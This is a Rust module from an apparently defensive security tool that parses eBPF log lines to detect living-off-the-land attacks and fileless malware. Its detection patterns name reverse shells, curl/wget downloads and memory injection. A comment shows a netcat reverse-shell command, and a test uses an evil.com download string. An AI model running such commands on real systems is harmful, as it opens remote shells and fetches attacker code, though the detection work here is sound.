//! Behavioral monitoring for Living Off The Land (LOTL) attack detection
//!
//! This module reads behavioral events from the systemd eBPF monitoring service
//! instead of spawning its own eBPF monitors. This allows the CLI to run without
//! root privileges while still accessing real-time behavioral data.

use serde::{Deserialize, Serialize};
use std::fs::File;
use std::io::{BufRead, BufReader};
use std::path::Path;
use std::time::{Duration, SystemTime, UNIX_EPOCH};

/// LOTL event captured by eBPF monitoring
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct LotlEvent {
    pub timestamp: u64,
    pub pid: u32,
    pub comm: String,
    pub event_type: LotlEventType,
    pub details: String,
    pub suspicion_score: f32,
}

/// Types of LOTL events we detect
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub enum LotlEventType {
    ReverseShell,
    PythonExec,
    BashInline,
    CurlDownload,
    WgetDownload,
    Base64Decode,
    MemfdCreate,
    ProcessInjection,
    SuspiciousParent,
    NetworkBeacon,
}

impl LotlEventType {
    /// Convert from log line pattern to event type
    fn from_pattern(pattern: &str) -> Option<Self> {
        if pattern.contains("reverse_shell") {
            Some(Self::ReverseShell)
        } else if pattern.contains("python -c") {
            Some(Self::PythonExec)
        } else if pattern.contains("bash -c") {
            Some(Self::BashInline)
        } else if pattern.contains("curl") && pattern.contains("http") {
            Some(Self::CurlDownload)
        } else if pattern.contains("wget") && pattern.contains("http") {
            Some(Self::WgetDownload)
        } else if pattern.contains("base64") && pattern.contains("-d") {
            Some(Self::Base64Decode)
        } else if pattern.contains("memfd_create") {
            Some(Self::MemfdCreate)
        } else if pattern.contains("proc_mem_write") {
            Some(Self::ProcessInjection)
        } else if pattern.contains("suspicious_parent") {
            Some(Self::SuspiciousParent)
        } else if pattern.contains("beacon") {
            Some(Self::NetworkBeacon)
        } else {
            None
        }
    }
}

/// Behavioral monitoring that reads from systemd logs
pub struct BehavioralMonitor {
    log_path: String,
}

impl BehavioralMonitor {
    pub fn new() -> Self {
        Self {
            log_path: "/var/log/winncore-ebpf.log".to_string(),
        }
    }

    /// Read recent LOTL events from the systemd eBPF service logs
    ///
    /// Returns events from the last `window` duration (default 5 minutes)
    pub fn read_recent_lotl_events(&self, window: Duration) -> anyhow::Result<Vec<LotlEvent>> {
        let now = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_secs();
        let cutoff = now - window.as_secs();

        let mut events = Vec::new();

        // Check if log file exists
        let log_path = Path::new(&self.log_path);
        if !log_path.exists() {
            // Log file doesn't exist yet - service might not be running
            return Ok(events);
        }

        // Read log file
        let file = File::open(log_path)?;
        let reader = BufReader::new(file);

        for line in reader.lines() {
            let line = line?;

            // Parse log lines in format:
            // [timestamp] [PID:comm] EVENT_TYPE: details (score: 0.X)
            if let Some(event) = self.parse_log_line(&line, cutoff) {
                events.push(event);
            }
        }

        // Sort by timestamp (newest first)
        events.sort_by(|a, b| b.timestamp.cmp(&a.timestamp));

        Ok(events)
    }

    /// Parse a single log line into a LotlEvent
    fn parse_log_line(&self, line: &str, cutoff_timestamp: u64) -> Option<LotlEvent> {
        // Example log format:
        // [1700000000] [PID:1234:bash] SUSPICIOUS: python -c 'import socket...' (score: 0.95)
        // [1700000001] [PID:5678:apache2] REVERSE_SHELL: nc -e /bin/bash 1.2.3.4 4444 (score: 0.99)

        let parts: Vec<&str> = line.split(']').collect();
        if parts.len() < 3 {
            return None;
        }

        // Extract timestamp
        let timestamp_str = parts[0].trim_start_matches('[').trim();
        let timestamp: u64 = timestamp_str.parse().ok()?;

        if timestamp < cutoff_timestamp {
            return None; // Too old
        }

        // Extract PID and comm
        let pid_comm_str = parts[1].trim_start_matches('[').trim();
        let pid_comm_parts: Vec<&str> = pid_comm_str.split(':').collect();
        if pid_comm_parts.len() < 3 {
            return None;
        }

        let pid: u32 = pid_comm_parts[1].parse().ok()?;
        let comm = pid_comm_parts[2].to_string();

        // Extract event details
        let details_part = parts[2..].join("]");
        let (event_details, score) = if let Some(score_pos) = details_part.rfind("(score:") {
            let details = details_part[..score_pos].trim().to_string();
            let score_str = &details_part[score_pos + 7..];
            let score = score_str
                .trim_end_matches(')')
                .trim()
                .parse()
                .unwrap_or(0.5);
            (details, score)
        } else {
            (details_part.trim().to_string(), 0.5)
        };

        // Determine event type from details
        let event_type = LotlEventType::from_pattern(&event_details)?;

        Some(LotlEvent {
            timestamp,
            pid,
            comm,
            event_type,
            details: event_details,
            suspicion_score: score,
        })
    }

    /// Get summary statistics of recent events
    pub fn get_event_summary(&self, window: Duration) -> anyhow::Result<EventSummary> {
        let events = self.read_recent_lotl_events(window)?;

        let total_events = events.len();
        let high_risk_events = events.iter().filter(|e| e.suspicion_score > 0.8).count();
        let medium_risk_events = events
            .iter()
            .filter(|e| e.suspicion_score > 0.5 && e.suspicion_score <= 0.8)
            .count();

        // Count by event type
        let mut event_counts = std::collections::HashMap::new();
        for event in &events {
            *event_counts
                .entry(format!("{:?}", event.event_type))
                .or_insert(0) += 1;
        }

        // Analyze process trees for suspicious parent-child relationships
        let mut suspicious_relationships = Vec::new();
        let mut analyzed_pids = std::collections::HashSet::new();

        for event in &events {
            // Only analyze each PID once to avoid duplicates
            if analyzed_pids.contains(&event.pid) {
                continue;
            }
            analyzed_pids.insert(event.pid);

            // Build process tree for this PID
            if let Ok(tree) = crate::process_tree::build_process_tree(event.pid) {
                // Analyze the tree for suspicious relationships
                let relationships = crate::process_tree::analyze_process_tree(&tree);
                suspicious_relationships.extend(relationships);
            }
        }

        // Parse network events from log
        let network_events = self.read_network_events(window)?;
        let network_stats = if !network_events.is_empty() {
            Some(self.get_network_stats(&network_events))
        } else {
            None
        };

        // Parse fileless malware events from log
        let fileless_events = self.read_fileless_events(window)?;
        let fileless_stats = if !fileless_events.is_empty() {
            Some(self.get_fileless_stats(&fileless_events))
        } else {
            None
        };

        Ok(EventSummary {
            total_events,
            high_risk_events,
            medium_risk_events,
            event_counts,
            most_recent: events.first().cloned(),
            suspicious_relationships,
            network_events,
            network_stats,
            fileless_events,
            fileless_stats,
        })
    }

    /// Read network events from the log file
    fn read_network_events(&self, window: Duration) -> anyhow::Result<Vec<crate::network_monitor::NetworkEvent>> {
        let now = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_secs();
        let cutoff = now - window.as_secs();

        let mut events = Vec::new();

        let log_path = Path::new(&self.log_path);
        if !log_path.exists() {
            return Ok(events);
        }

        let file = File::open(log_path)?;
        let reader = BufReader::new(file);

        for line in reader.lines() {
            let line = line?;
            if line.contains("NETWORK:") {
                if let Some(event) = crate::network_monitor::parse_network_event(&line) {
                    if event.timestamp >= cutoff {
                        events.push(event);
                    }
                }
            }
        }

        // Sort by timestamp (newest first)
        events.sort_by(|a, b| b.timestamp.cmp(&a.timestamp));

        Ok(events)
    }

    /// Calculate network statistics
    fn get_network_stats(&self, events: &[crate::network_monitor::NetworkEvent]) -> crate::network_monitor::NetworkStats {
        let mut unique_connections = std::collections::HashSet::new();
        let mut beaconing_count = 0;

        for event in events {
            unique_connections.insert((event.remote_ip.clone(), event.remote_port));
            if event.event_type == crate::network_monitor::NetworkEventType::Beacon {
                beaconing_count += 1;
            }
        }

        crate::network_monitor::NetworkStats {
            total_connections: unique_connections.len(),
            beaconing_connections: beaconing_count,
            malicious_ip_count: 0, // Would be loaded from threat intel
        }
    }

    /// Read fileless malware events from the log file
    fn read_fileless_events(&self, window: Duration) -> anyhow::Result<Vec<crate::fileless::FilelessEvent>> {
        let now = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_secs();
        let cutoff = now - window.as_secs();

        let mut events = Vec::new();

        let log_path = Path::new(&self.log_path);
        if !log_path.exists() {
            return Ok(events);
        }

        let file = File::open(log_path)?;
        let reader = BufReader::new(file);

        for line in reader.lines() {
            let line = line?;
            // Look for fileless indicators
            if line.contains("MEMFD_CREATE")
                || line.contains("memfd_create")
                || line.contains("PTRACE")
                || line.contains("ptrace")
                || line.contains("PROC_MEM_WRITE")
                || line.contains("proc_mem_write")
                || line.contains("/dev/shm/")
            {
                if let Some(event) = crate::fileless::parse_fileless_event(&line) {
                    if event.timestamp >= cutoff {
                        events.push(event);
                    }
                }
            }
        }

        // Sort by timestamp (newest first)
        events.sort_by(|a, b| b.timestamp.cmp(&a.timestamp));

        Ok(events)
    }

    /// Calculate fileless malware statistics
    fn get_fileless_stats(&self, events: &[crate::fileless::FilelessEvent]) -> crate::fileless::FilelessStats {
        let mut memfd_processes = std::collections::HashSet::new();
        let mut injection_targets = std::collections::HashSet::new();

        for event in events {
            match event.technique {
                crate::fileless::FilelessTechnique::MemfdCreate => {
                    memfd_processes.insert(event.pid);
                }
                crate::fileless::FilelessTechnique::PtraceInjection
                | crate::fileless::FilelessTechnique::ProcMemWrite => {
                    if let Some(target) = event.target_pid {
                        injection_targets.insert(target);
                    }
                }
                _ => {}
            }
        }

        crate::fileless::FilelessStats {
            total_memfd_processes: memfd_processes.len(),
            total_memfd_fds: events
                .iter()
                .filter(|e| e.technique == crate::fileless::FilelessTechnique::MemfdCreate)
                .count(),
            total_injection_targets: injection_targets.len(),
        }
    }
}

/// Summary of behavioral events
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EventSummary {
    pub total_events: usize,
    pub high_risk_events: usize,
    pub medium_risk_events: usize,
    pub event_counts: std::collections::HashMap<String, usize>,
    pub most_recent: Option<LotlEvent>,
    /// Suspicious parent-child process relationships detected
    pub suspicious_relationships: Vec<crate::process_tree::ProcessRelationship>,
    /// Network behavior events (C2, beaconing, etc.)
    pub network_events: Vec<crate::network_monitor::NetworkEvent>,
    /// Network statistics
    pub network_stats: Option<crate::network_monitor::NetworkStats>,
    /// Fileless malware events (memfd, injection, etc.)
    pub fileless_events: Vec<crate::fileless::FilelessEvent>,
    /// Fileless detection statistics
    pub fileless_stats: Option<crate::fileless::FilelessStats>,
}

impl Default for BehavioralMonitor {
    fn default() -> Self {
        Self::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_parse_log_line() {
        let monitor = BehavioralMonitor::new();
        let line = "[1700000000] [PID:1234:bash] python -c 'import socket' (score: 0.95)";

        let event = monitor.parse_log_line(line, 0);
        assert!(event.is_some());

        let event = event.unwrap();
        assert_eq!(event.pid, 1234);
        assert_eq!(event.comm, "bash");
        assert_eq!(event.event_type, LotlEventType::PythonExec);
        assert!((event.suspicion_score - 0.95).abs() < 0.01);
    }

    #[test]
    fn test_event_type_detection() {
        assert_eq!(
            LotlEventType::from_pattern("reverse_shell detected"),
            Some(LotlEventType::ReverseShell)
        );
        assert_eq!(
            LotlEventType::from_pattern("python -c detected"),
            Some(LotlEventType::PythonExec)
        );
        assert_eq!(
            LotlEventType::from_pattern("curl http://evil.com"),
            Some(LotlEventType::CurlDownload)
        );
    }
}
